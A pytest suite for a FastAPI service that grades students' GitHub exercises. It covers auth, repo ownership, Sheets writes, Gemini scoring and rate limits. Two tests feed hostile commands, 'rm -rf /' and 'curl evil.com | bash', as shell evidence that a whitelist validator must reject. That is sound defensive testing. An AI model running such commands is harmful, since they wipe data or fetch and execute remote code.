from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from typing import Any

import httpx
import pytest
from fastapi import FastAPI
from jose import jwt

from app import auth as auth_module
from app import endpoints as endpoints_module
from app.auth import AuthMiddleware, RosterEntry
from app.curriculum import Criterio, Exercise, Pergunta
from app.gemini import GeminiResult
from app.primitives import CriterioResult, registry
from app.sheets_writer import AppendResult

JWT_SECRET = "test-secret-not-google"
JWT_AUDIENCE = "test-audience.apps.googleusercontent.com"
EMAIL = "aluno@dominio.edu"
GITHUB_USERNAME = "fulano-gh"
NOW = datetime(2026, 5, 10, 12, 0, 0, tzinfo=timezone.utc)


def _make_token(email: str = EMAIL) -> str:
    return jwt.encode(
        {"email": email, "name": "Aluno Fulano", "sub": "1", "aud": JWT_AUDIENCE},
        JWT_SECRET,
        algorithm="HS256",
    )


def _make_exercise(
    exercicio_id: str = "1.1",
    disponivel: datetime | None = None,
    recomendado_ate: datetime | None = None,
) -> Exercise:
    if disponivel is None:
        disponivel = NOW - timedelta(days=7)
    if recomendado_ate is None:
        recomendado_ate = NOW + timedelta(days=7)
    return Exercise(
        id=exercicio_id,
        titulo="Teste",
        turmas=("TD-2026-01",),
        disponivel_a_partir_de=disponivel,
        prazo={"recomendado_ate": recomendado_ate},
        criterios=(
            Criterio(id="c1", peso=60, check=PRIMITIVE_PASS, args={}),
            Criterio(id="c2", peso=40, check=PRIMITIVE_FAIL, args={}),
        ),
    )


PRIMITIVE_PASS = "test.endpoints.always_pass"
PRIMITIVE_FAIL = "test.endpoints.always_fail"


@pytest.fixture(autouse=True)
def _register_test_primitives():
    def always_pass(args: dict, evidence: dict) -> CriterioResult:
        peso = args.get("_peso", 0)
        return CriterioResult(passed=True, points_earned=peso, points_max=peso, message="ok")

    def always_fail(args: dict, evidence: dict) -> CriterioResult:
        peso = args.get("_peso", 0)
        return CriterioResult(passed=False, points_earned=0, points_max=peso, message="nope")

    registry[PRIMITIVE_PASS] = always_pass
    registry[PRIMITIVE_FAIL] = always_fail
    yield
    registry.pop(PRIMITIVE_PASS, None)
    registry.pop(PRIMITIVE_FAIL, None)


@pytest.fixture
def roster_fixture() -> dict[str, RosterEntry]:
    return {
        EMAIL: RosterEntry(
            email=EMAIL,
            nome="Aluno Fulano",
            turma="TD-2026-01",
            github_username=GITHUB_USERNAME,
        ),
    }


@dataclass
class FakeGitHub:
    evidence: dict[str, Any]

    def collect_evidence(self, repo_url: str) -> dict[str, Any]:
        return self.evidence


@dataclass
class FakeSheets:
    append_result: AppendResult | None = None
    submissions_rows: list[list[str]] | None = None
    previews_rows: list[list[str]] | None = None
    appended_rows: list[Any] = None  # type: ignore[assignment]
    appended_previews: list[tuple[str, str, str]] = None  # type: ignore[assignment]

    def __post_init__(self) -> None:
        self.appended_rows = []
        self.appended_previews = []

    async def append_submission(self, row: Any) -> AppendResult:
        self.appended_rows.append(row)
        assert self.append_result is not None, "configure append_result"
        return self.append_result

    async def read_submissions(self) -> list[list[str]]:
        return self.submissions_rows or []

    async def read_previews(self) -> list[list[str]]:
        return self.previews_rows or []

    async def append_preview_attempt(self, timestamp_utc: str, email: str, exercicio: str) -> None:
        self.appended_previews.append((timestamp_utc, email, exercicio))


@pytest.fixture
def patches(monkeypatch, roster_fixture):
    def fake_verify(token: str, request_obj, audience: str):
        return jwt.decode(token, JWT_SECRET, algorithms=["HS256"], audience=audience)

    monkeypatch.setattr(auth_module.id_token, "verify_oauth2_token", fake_verify)
    monkeypatch.setattr(auth_module, "get_roster", lambda: roster_fixture)
    monkeypatch.setenv("GOOGLE_OAUTH_CLIENT_ID", JWT_AUDIENCE)
    monkeypatch.setattr(endpoints_module, "_now_utc", lambda: NOW)
    return monkeypatch


def _make_app() -> FastAPI:
    app = FastAPI()
    app.add_middleware(AuthMiddleware)
    app.include_router(endpoints_module.router)
    return app


async def _post(app: FastAPI, path: str, body: dict, token: str | None = None) -> httpx.Response:
    headers = {"Authorization": f"Bearer {token or _make_token()}"}
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        return await client.post(path, json=body, headers=headers)


async def _get(app: FastAPI, path: str, token: str | None = None) -> httpx.Response:
    headers = {"Authorization": f"Bearer {token or _make_token()}"}
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        return await client.get(path, headers=headers)


def _patch_endpoints(
    monkeypatch,
    *,
    exercise: Exercise | None = None,
    yaml_text: str = "exercicio: 1.1\n",
    github_evidence: dict[str, Any] | None = None,
    sheets: FakeSheets | None = None,
) -> FakeSheets:
    if exercise is None:
        exercise = _make_exercise()
    if github_evidence is None:
        github_evidence = {"repo_exists": True, "files_list": []}
    if sheets is None:
        sheets = FakeSheets()

    monkeypatch.setattr(
        endpoints_module,
        "load_exercise",
        lambda eid: (exercise, yaml_text),
    )
    monkeypatch.setattr(
        endpoints_module,
        "get_github_client",
        lambda: FakeGitHub(evidence=github_evidence),
    )
    monkeypatch.setattr(endpoints_module, "get_sheets_writer", lambda: sheets)
    return sheets


@pytest.mark.asyncio
async def test_grade_preview_happy_path(patches) -> None:
    _patch_endpoints(patches)
    response = await _post(
        _make_app(),
        "/grade-preview",
        {"exercicio": "1.1", "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto"},
    )
    assert response.status_code == 200
    body = response.json()
    assert body["bulletin"]["total"] == 60
    assert body["bulletin"]["max_total"] == 100
    assert body["late"] is False
    assert body["dias_apos_recomendado"] == 0


@pytest.mark.asyncio
async def test_grade_preview_exercise_not_open_yet(patches) -> None:
    future = NOW + timedelta(days=1)
    _patch_endpoints(patches, exercise=_make_exercise(disponivel=future))
    response = await _post(
        _make_app(),
        "/grade-preview",
        {"exercicio": "1.1", "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto"},
    )
    assert response.status_code == 403
    assert response.json() == {"error": "exercise_not_open_yet"}


@pytest.mark.asyncio
async def test_grade_preview_repo_owner_mismatch(patches) -> None:
    _patch_endpoints(patches)
    response = await _post(
        _make_app(),
        "/grade-preview",
        {"exercicio": "1.1", "repo_url": "https://github.com/outra-pessoa/projeto"},
    )
    assert response.status_code == 403
    assert response.json() == {"error": "repo_owner_mismatch"}


@pytest.mark.asyncio
async def test_grade_preview_late_calculation(patches) -> None:
    past = NOW - timedelta(days=3)
    _patch_endpoints(patches, exercise=_make_exercise(recomendado_ate=past))
    response = await _post(
        _make_app(),
        "/grade-preview",
        {"exercicio": "1.1", "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto"},
    )
    assert response.status_code == 200
    body = response.json()
    assert body["late"] is True
    assert body["dias_apos_recomendado"] == 3


@pytest.mark.asyncio
async def test_submissions_happy_path_writes_row(patches) -> None:
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=10, row_count_after=11, sheet_row_index=11
        )
    )
    _patch_endpoints(patches, sheets=sheets)
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-001",
        },
    )
    assert response.status_code == 200
    body = response.json()
    assert body["written"] is True
    assert body["submission_id"] == "uuid-001"
    assert body["bulletin"]["total"] == 60
    assert len(sheets.appended_rows) == 1
    appended = sheets.appended_rows[0]
    assert appended.submission_id == "uuid-001"
    assert appended.email == EMAIL
    assert appended.exercicio == "1.1"
    assert appended.nota == 60
    assert appended.nota_max == 100
    # spec_sha is SHA-256 hex of yaml_text "exercicio: 1.1\n"
    assert len(appended.spec_sha) == 64
    assert all(c in "0123456789abcdef" for c in appended.spec_sha)


@pytest.mark.asyncio
async def test_submissions_idempotency_hit(patches) -> None:
    sheets = FakeSheets(
        append_result=AppendResult(
            written=False, row_count_before=11, row_count_after=11, sheet_row_index=5
        )
    )
    _patch_endpoints(patches, sheets=sheets)
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-001",
        },
    )
    assert response.status_code == 200
    assert response.json()["written"] is False


@pytest.mark.asyncio
async def test_submissions_drop_detection_returns_503(patches) -> None:
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=10, row_count_after=10, sheet_row_index=-1
        )
    )
    _patch_endpoints(patches, sheets=sheets)
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-drop",
        },
    )
    assert response.status_code == 503
    assert response.json() == {"error": "sheets_drop_detected"}


@pytest.mark.asyncio
async def test_submissions_exercise_not_open_yet(patches) -> None:
    future = NOW + timedelta(days=2)
    _patch_endpoints(patches, exercise=_make_exercise(disponivel=future))
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-x",
        },
    )
    assert response.status_code == 403
    assert response.json() == {"error": "exercise_not_open_yet"}


@pytest.mark.asyncio
async def test_me_grades_groups_by_exercicio(patches) -> None:
    sheets = FakeSheets(
        submissions_rows=[
            [
                "timestamp_utc",
                "submission_id",
                "email",
                "nome",
                "turma",
                "exercicio",
                "nota",
                "nota_max",
            ],
            ["2026-05-08T10:00:00+00:00", "u1", EMAIL, "x", "y", "1.1", "60", "100"],
            ["2026-05-09T10:00:00+00:00", "u2", EMAIL, "x", "y", "1.1", "80", "100"],
            ["2026-05-09T11:00:00+00:00", "u3", EMAIL, "x", "y", "1.2", "100", "100"],
            ["2026-05-10T10:00:00+00:00", "u4", "outro@x.com", "z", "y", "1.1", "100", "100"],
        ]
    )
    _patch_endpoints(patches, sheets=sheets)
    response = await _get(_make_app(), "/me/grades")
    assert response.status_code == 200
    body = response.json()
    grades = {g["exercicio"]: g for g in body["grades"]}
    assert set(grades.keys()) == {"1.1", "1.2"}
    assert grades["1.1"]["melhor_nota"] == 80
    assert grades["1.1"]["num_tentativas"] == 2
    assert grades["1.1"]["ultima_submissao_at"] == "2026-05-09T10:00:00+00:00"
    assert grades["1.2"]["melhor_nota"] == 100
    assert grades["1.2"]["num_tentativas"] == 1


@pytest.mark.asyncio
async def test_me_grades_empty(patches) -> None:
    sheets = FakeSheets(submissions_rows=[])
    _patch_endpoints(patches, sheets=sheets)
    response = await _get(_make_app(), "/me/grades")
    assert response.status_code == 200
    assert response.json() == {"grades": []}


@pytest.mark.asyncio
async def test_me_identity_returns_email_nome_turma_github(patches) -> None:
    _patch_endpoints(patches)
    response = await _get(_make_app(), "/me/identity")
    assert response.status_code == 200
    assert response.json() == {
        "email": EMAIL,
        "nome": "Aluno Fulano",
        "turma": "TD-2026-01",
        "github_username": GITHUB_USERNAME,
    }


@pytest.mark.asyncio
async def test_me_identity_returns_empty_github_username_when_not_set(monkeypatch) -> None:
    """Roster entry com github_username vazio é exposto literalmente (CLI usa pra
    decidir se prompta o aluno por /me/profile)."""
    empty_roster = {
        EMAIL: RosterEntry(
            email=EMAIL,
            nome="Aluno Fulano",
            turma="TD-2026-01",
            github_username="",
        ),
    }

    def fake_verify(token: str, request_obj, audience: str):
        return jwt.decode(token, JWT_SECRET, algorithms=["HS256"], audience=audience)

    monkeypatch.setattr(auth_module.id_token, "verify_oauth2_token", fake_verify)
    monkeypatch.setattr(auth_module, "get_roster", lambda: empty_roster)
    monkeypatch.setenv("GOOGLE_OAUTH_CLIENT_ID", JWT_AUDIENCE)

    response = await _get(_make_app(), "/me/identity")
    assert response.status_code == 200
    assert response.json() == {
        "email": EMAIL,
        "nome": "Aluno Fulano",
        "turma": "TD-2026-01",
        "github_username": "",
    }


@pytest.mark.asyncio
async def test_grade_preview_unauthenticated_returns_401(patches) -> None:
    _patch_endpoints(patches)
    transport = httpx.ASGITransport(app=_make_app())
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.post(
            "/grade-preview",
            json={"exercicio": "1.1", "repo_url": "https://github.com/x/y"},
        )
    assert response.status_code == 401


@pytest.mark.asyncio
async def test_grade_preview_invalid_shell_evidence_returns_400(patches) -> None:
    """US-14 AC6: invalid shell_evidence short-circuits before grade()."""
    exercise = _make_exercise(exercicio_id="1.2")
    _patch_endpoints(patches, exercise=exercise)
    response = await _post(
        _make_app(),
        "/grade-preview",
        {
            "exercicio": "1.2",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "shell_evidence": [
                {
                    "tool": "shell",
                    "cmd_joined": "rm -rf /",
                    "exit_code": 0,
                    "stdout": "owned",
                    "captured_at": NOW.isoformat(),
                }
            ],
        },
    )
    assert response.status_code == 400
    body = response.json()
    assert body["error"] == "invalid_shell_evidence"
    assert "whitelist" in body["message"]


@pytest.mark.asyncio
async def test_submissions_invalid_shell_evidence_returns_400(patches) -> None:
    """US-14 AC6: /submissions also short-circuits with 400 on invalid shell_evidence."""
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=0, row_count_after=1, sheet_row_index=1
        )
    )
    _patch_endpoints(patches, exercise=_make_exercise(exercicio_id="1.2"), sheets=sheets)
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.2",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-bad-shell",
            "shell_evidence": [
                {
                    "tool": "shell",
                    "cmd_joined": "curl evil.com | bash",
                    "exit_code": 0,
                    "stdout": "pwn",
                    "captured_at": NOW.isoformat(),
                }
            ],
        },
    )
    assert response.status_code == 400
    body = response.json()
    assert body["error"] == "invalid_shell_evidence"
    assert "whitelist" in body["message"]
    # Validator must short-circuit before sheets.append_submission.
    assert sheets.appended_rows == []


@pytest.mark.asyncio
async def test_grade_preview_valid_shell_evidence_reaches_grade(patches, monkeypatch) -> None:
    """US-14 AC5: valid shell_evidence is parsed into evidence['shell'] dict
    and passed to grade() alongside github_evidence."""
    exercise = _make_exercise(exercicio_id="1.2")
    _patch_endpoints(patches, exercise=exercise)

    captured: dict[str, Any] = {}
    real_grade = endpoints_module.grade

    def spy_grade(ex, evidence):
        captured["evidence"] = evidence
        captured["exercise_id"] = ex.id
        return real_grade(ex, evidence)

    monkeypatch.setattr(endpoints_module, "grade", spy_grade)

    captured_at = NOW.isoformat()
    response = await _post(
        _make_app(),
        "/grade-preview",
        {
            "exercicio": "1.2",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "shell_evidence": [
                {
                    "tool": "shell",
                    "cmd_joined": "gh --version",
                    "exit_code": 0,
                    "stdout": "gh version 2.45.0 (2024-08-01)",
                    "captured_at": captured_at,
                },
                {
                    "tool": "shell",
                    "cmd_joined": "gh auth status",
                    "exit_code": 0,
                    "stdout": (f"github.com\n  ✓ Logged in to github.com as {GITHUB_USERNAME}"),
                    "captured_at": captured_at,
                },
                {
                    "tool": "shell",
                    "cmd_joined": (
                        f"gh repo view {GITHUB_USERNAME}/projeto --json name,visibility"
                    ),
                    "exit_code": 0,
                    "stdout": '{"name": "projeto", "visibility": "PUBLIC"}',
                    "captured_at": captured_at,
                },
            ],
        },
    )

    assert response.status_code == 200
    assert "evidence" in captured, "grade() was not invoked"
    evidence = captured["evidence"]
    # github_evidence keys still present alongside the shell context.
    assert evidence["repo_exists"] is True
    shell = evidence["shell"]
    assert isinstance(shell, dict)
    assert shell["gh_version"] == "2.45.0"
    assert shell["gh_auth_ok"] is True
    assert shell["gh_auth_user"] == GITHUB_USERNAME
    assert shell["gh_repo_view"] == {"name": "projeto", "visibility": "PUBLIC"}
    assert "gh --version" in shell["commands_seen"]


# ---------- Perguntas subjetivas + Gemini grading ----------


def _exercise_with_perguntas(num: int = 1) -> Exercise:
    base = _make_exercise()
    perguntas = tuple(
        Pergunta(
            texto=f"Pergunta {i + 1}?",
            criterios_avaliacao=f"Critério avaliação {i + 1}",
            peso=10,
        )
        for i in range(num)
    )
    return Exercise(
        id=base.id,
        titulo=base.titulo,
        turmas=base.turmas,
        disponivel_a_partir_de=base.disponivel_a_partir_de,
        prazo=base.prazo,
        criterios=base.criterios,
        perguntas=perguntas,
    )


@pytest.mark.asyncio
async def test_grade_preview_returns_perguntas(patches) -> None:
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=2))
    response = await _post(
        _make_app(),
        "/grade-preview",
        {"exercicio": "1.1", "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto"},
    )
    assert response.status_code == 200
    body = response.json()
    assert body["perguntas"] == [
        {"texto": "Pergunta 1?", "peso": 10},
        {"texto": "Pergunta 2?", "peso": 10},
    ]
    # criterios_avaliacao NÃO é exposto pro aluno (evita gaming)
    assert "criterios_avaliacao" not in body["perguntas"][0]


@pytest.mark.asyncio
async def test_grade_preview_no_perguntas_returns_empty_list(patches) -> None:
    _patch_endpoints(patches)
    response = await _post(
        _make_app(),
        "/grade-preview",
        {"exercicio": "1.1", "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto"},
    )
    assert response.status_code == 200
    assert response.json()["perguntas"] == []


@pytest.mark.asyncio
async def test_submissions_respostas_missing_when_required(patches, monkeypatch) -> None:
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=0, row_count_after=1, sheet_row_index=2
        )
    )
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=1), sheets=sheets)
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-noresp",
        },
    )
    assert response.status_code == 400
    assert response.json()["error"] == "respostas_missing"
    assert len(sheets.appended_rows) == 0  # não persistiu


@pytest.mark.asyncio
async def test_submissions_respostas_count_mismatch(patches) -> None:
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=0, row_count_after=1, sheet_row_index=2
        )
    )
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=2), sheets=sheets)
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-x",
            "respostas": ["só uma"],
        },
    )
    assert response.status_code == 400
    assert response.json()["error"] == "respostas_count_mismatch"


@pytest.mark.asyncio
async def test_submissions_resposta_empty_rejected(patches) -> None:
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=0, row_count_after=1, sheet_row_index=2
        )
    )
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=1), sheets=sheets)
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-empty",
            "respostas": ["   "],
        },
    )
    assert response.status_code == 400
    assert response.json()["error"] == "resposta_empty"


@pytest.mark.asyncio
async def test_submissions_happy_path_with_gemini(patches, monkeypatch) -> None:
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=0, row_count_after=1, sheet_row_index=2
        )
    )
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=1), sheets=sheets)

    # Mock Gemini: retorna nota 7 num peso 10
    monkeypatch.setattr(
        endpoints_module,
        "grade_respostas",
        lambda items: [GeminiResult(nota=7, feedback="razoável", ok=True) for _ in items],
    )

    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-gem",
            "respostas": ["minha reflexão"],
        },
    )
    assert response.status_code == 200
    body = response.json()
    # 60 (base) + 7 (gemini) = 67; max 100 + 10 = 110
    assert body["bulletin"]["total"] == 67
    assert body["bulletin"]["max_total"] == 110
    # respostas_json persistido
    appended = sheets.appended_rows[0]
    import json as _json

    payload = _json.loads(appended.respostas_json)
    assert payload[0]["resposta"] == "minha reflexão"
    assert payload[0]["nota"] == 7
    assert payload[0]["feedback"] == "razoável"
    assert payload[0]["gemini_ok"] is True


@pytest.mark.asyncio
async def test_submissions_gemini_failure_falls_back_to_max(patches, monkeypatch) -> None:
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=0, row_count_after=1, sheet_row_index=2
        )
    )
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=1), sheets=sheets)
    monkeypatch.setattr(
        endpoints_module,
        "grade_respostas",
        lambda items: [
            GeminiResult(nota=10, feedback="gemini_unavailable", ok=False) for _ in items
        ],
    )
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-fb",
            "respostas": ["qualquer coisa"],
        },
    )
    assert response.status_code == 200
    appended = sheets.appended_rows[0]
    import json as _json

    payload = _json.loads(appended.respostas_json)
    assert payload[0]["nota"] == 10  # peso máximo no fallback
    assert payload[0]["gemini_ok"] is False


@pytest.mark.asyncio
async def test_submissions_rate_limit_cooldown(patches, monkeypatch) -> None:
    # Submission existente 10s atrás (< 30s cooldown)
    recent = (NOW - timedelta(seconds=10)).isoformat()
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=1, row_count_after=2, sheet_row_index=2
        ),
        submissions_rows=[
            ["header"] * 18,
            [recent, "uuid-prev", EMAIL, "Aluno", "TD-2026-01", "1.1", "60", "100"] + [""] * 10,
        ],
    )
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=1), sheets=sheets)
    monkeypatch.setattr(
        endpoints_module,
        "grade_respostas",
        lambda items: [GeminiResult(nota=10, feedback="ok", ok=True) for _ in items],
    )
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-rl",
            "respostas": ["resposta"],
        },
    )
    assert response.status_code == 429
    assert response.json()["error"] == "rate_limit_cooldown"
    assert len(sheets.appended_rows) == 0


@pytest.mark.asyncio
async def test_submissions_rate_limit_daily_cap(patches, monkeypatch) -> None:
    # Excede o cap: cap+1 submissions hoje (BRT), todas > 30s atrás (passa
    # cooldown) e no mesmo dia local. Minutos pra não cruzar a meia-noite BRT.
    n = endpoints_module.RATE_LIMIT_DAILY_CAP + 1
    rows = [["header"] * 18]
    for i in range(n):
        ts = (NOW - timedelta(minutes=i + 1)).isoformat()
        rows.append([ts, f"uuid-{i}", EMAIL, "Aluno", "TD-2026-01", "1.1", "60", "100"] + [""] * 10)
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=10, row_count_after=11, sheet_row_index=12
        ),
        submissions_rows=rows,
    )
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=1), sheets=sheets)
    monkeypatch.setattr(
        endpoints_module,
        "grade_respostas",
        lambda items: [GeminiResult(nota=10, feedback="ok", ok=True) for _ in items],
    )
    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-cap",
            "respostas": ["resposta"],
        },
    )
    assert response.status_code == 429
    assert response.json()["error"] == "rate_limit_daily_cap"


@pytest.mark.asyncio
async def test_submissions_no_perguntas_skips_rate_limit(patches, monkeypatch) -> None:
    """Exercício sem perguntas: nem rate-limit, nem Gemini, nem respostas_json."""
    sheets = FakeSheets(
        append_result=AppendResult(
            written=True, row_count_before=0, row_count_after=1, sheet_row_index=2
        ),
    )
    _patch_endpoints(patches, sheets=sheets)  # exercise default = sem perguntas

    gemini_called = {"yes": False}

    def boom(items):
        gemini_called["yes"] = True
        return []

    monkeypatch.setattr(endpoints_module, "grade_respostas", boom)

    response = await _post(
        _make_app(),
        "/submissions",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "submission_uuid": "uuid-noq",
        },
    )
    assert response.status_code == 200
    assert gemini_called["yes"] is False
    appended = sheets.appended_rows[0]
    assert appended.respostas_json == ""


# ---------- /grade-preview com respostas: Gemini + rate-limit ----------


@pytest.mark.asyncio
async def test_grade_preview_with_respostas_runs_gemini_and_appends_to_bulletin(
    patches, monkeypatch
) -> None:
    sheets = FakeSheets()
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=1), sheets=sheets)
    monkeypatch.setattr(
        endpoints_module,
        "grade_respostas",
        lambda items: [GeminiResult(nota=8, feedback="boa", ok=True) for _ in items],
    )
    response = await _post(
        _make_app(),
        "/grade-preview",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "respostas": ["minha resposta"],
        },
    )
    assert response.status_code == 200
    body = response.json()
    # 60 (base) + 8 (gemini) = 68; max 100 + 10 = 110
    assert body["bulletin"]["total"] == 68
    assert body["bulletin"]["max_total"] == 110
    # tentativa contabilizada
    assert len(sheets.appended_previews) == 1
    _, recorded_email, recorded_exercicio = sheets.appended_previews[0]
    assert recorded_email == EMAIL
    assert recorded_exercicio == "1.1"


@pytest.mark.asyncio
async def test_grade_preview_without_respostas_does_not_call_gemini(patches, monkeypatch) -> None:
    sheets = FakeSheets()
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=1), sheets=sheets)
    gemini_called = {"yes": False}

    def boom(items):
        gemini_called["yes"] = True
        return []

    monkeypatch.setattr(endpoints_module, "grade_respostas", boom)
    response = await _post(
        _make_app(),
        "/grade-preview",
        {"exercicio": "1.1", "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto"},
    )
    assert response.status_code == 200
    assert gemini_called["yes"] is False
    assert len(sheets.appended_previews) == 0


@pytest.mark.asyncio
async def test_grade_preview_respostas_count_mismatch(patches) -> None:
    sheets = FakeSheets()
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=2), sheets=sheets)
    response = await _post(
        _make_app(),
        "/grade-preview",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "respostas": ["só uma"],
        },
    )
    assert response.status_code == 400
    assert response.json()["error"] == "respostas_count_mismatch"
    assert len(sheets.appended_previews) == 0


@pytest.mark.asyncio
async def test_grade_preview_rate_limit_cooldown(patches, monkeypatch) -> None:
    recent = (NOW - timedelta(seconds=10)).isoformat()
    sheets = FakeSheets(previews_rows=[["header"] * 3, [recent, EMAIL, "1.1"]])
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=1), sheets=sheets)
    monkeypatch.setattr(
        endpoints_module,
        "grade_respostas",
        lambda items: [GeminiResult(nota=10, feedback="ok", ok=True) for _ in items],
    )
    response = await _post(
        _make_app(),
        "/grade-preview",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "respostas": ["x"],
        },
    )
    assert response.status_code == 429
    assert response.json()["error"] == "rate_limit_preview_cooldown"
    # Gemini não foi chamado (rate-limit cortou antes)
    assert len(sheets.appended_previews) == 0


@pytest.mark.asyncio
async def test_grade_preview_rate_limit_daily_cap(patches, monkeypatch) -> None:
    # Excede o cap: cap+1 previews mesma data local (BRT), todas > 30s atrás.
    # NOW = 2026-05-10 12:00 UTC = 2026-05-10 09:00 BRT. Minutos pra ficar no dia.
    n = endpoints_module.RATE_LIMIT_DAILY_CAP + 1
    rows = [["header"] * 3]
    for minutes_ago in range(1, n + 1):
        ts = (NOW - timedelta(minutes=minutes_ago)).isoformat()
        rows.append([ts, EMAIL, "1.1"])
    sheets = FakeSheets(previews_rows=rows)
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=1), sheets=sheets)
    monkeypatch.setattr(
        endpoints_module,
        "grade_respostas",
        lambda items: [GeminiResult(nota=10, feedback="ok", ok=True) for _ in items],
    )
    response = await _post(
        _make_app(),
        "/grade-preview",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "respostas": ["x"],
        },
    )
    assert response.status_code == 429
    assert response.json()["error"] == "rate_limit_preview_daily_cap"
    assert len(sheets.appended_previews) == 0


@pytest.mark.asyncio
async def test_grade_preview_rate_limit_resets_at_local_midnight(patches, monkeypatch) -> None:
    """Submissões de DIAS LOCAIS anteriores não contam pro cap."""
    # 3 previews HONTEM (BRT) — todas em 2026-05-09 BRT.
    # NOW = 2026-05-10 12:00 UTC = 09:00 BRT. Hontem = 2026-05-09.
    # 12h atrás UTC = 00:00 UTC = 21:00 BRT do dia anterior (2026-05-09).
    rows = [["header"] * 3]
    for hours_ago in (12, 14, 16):
        ts = (NOW - timedelta(hours=hours_ago)).isoformat()
        rows.append([ts, EMAIL, "1.1"])
    sheets = FakeSheets(previews_rows=rows)
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=1), sheets=sheets)
    monkeypatch.setattr(
        endpoints_module,
        "grade_respostas",
        lambda items: [GeminiResult(nota=10, feedback="ok", ok=True) for _ in items],
    )
    response = await _post(
        _make_app(),
        "/grade-preview",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "respostas": ["resposta"],
        },
    )
    # cap NÃO foi atingido — rows são do dia anterior local
    assert response.status_code == 200
    assert len(sheets.appended_previews) == 1


@pytest.mark.asyncio
async def test_grade_preview_rate_limit_bypass_for_allowlist_email(patches, monkeypatch) -> None:
    """Emails em RATE_LIMIT_BYPASS_EMAILS pulam rate-limit (uso: prof testando)."""
    monkeypatch.setenv("RATE_LIMIT_BYPASS_EMAILS", f"outroprof@x.com,{EMAIL}")
    # 3 previews hoje (BRT) — normalmente bloquearia
    rows = [["header"] * 3]
    for hours_ago in (1, 2, 3):
        ts = (NOW - timedelta(hours=hours_ago)).isoformat()
        rows.append([ts, EMAIL, "1.1"])
